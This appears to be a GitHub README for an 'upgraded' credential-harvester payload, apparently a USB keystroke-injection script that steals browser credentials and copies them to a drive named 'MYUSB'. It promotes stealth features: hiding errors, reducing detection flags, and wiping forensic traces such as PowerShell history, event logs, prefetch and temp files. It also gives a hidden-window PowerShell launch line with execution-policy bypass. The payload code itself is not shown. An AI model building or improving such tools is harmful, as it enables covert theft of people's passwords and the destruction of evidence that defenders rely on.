# Upgrade-on-MarkCyber-Credential-Harvester
This is a greatly upgraded and enhanced version of the Credential Harvester payload initially made by MarkCyber, it includes many security, failsafe and forsenic trace deletion that werent included on the first payload.

========================== **READ ME & CREDITS** ===========================
- Script based on **markcyber's** work, updated for stealthier operation by **Nonnamme** (GreyHatUser)
- Credits: **Based** on (github.com/markcyber) **Updated** by (github.com/GreyHatUser)
- **Requieres** an Exfil USB drive named 'MYUSB', **can be changed** to another name

====================================================================

============================== **UPDATES** ===============================
- From the original payload i included many protocols for **stealthy operation** **reducing flags** and **clear possible logs and traces of activity.**   
- For starters most commands are shielded in case  of error **evading error messages pop up during the operation.**             
- I added many coments and delays to **optimise and shield the process in case its executed in slower pc's.**                   
- I formated the entire code for better readability, debugging and modification.                                            
- Also merged some STRING lines that were separated for no aparent reason, cleaning some steps.                             
- Added **compatibility for Opera GX browser.**                                                                                 
- Key Updates on **forsenic trace deletion**: Clear file history, PowerShell history, PS EventLogs, prefetch for PS, temp files.

====================================================================

================================ **OPTIONS** =============================

You can change the open powershell for this line in case you need the window to stay hidden during the execution of the payload

====================================================================

    powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden

====================================================================
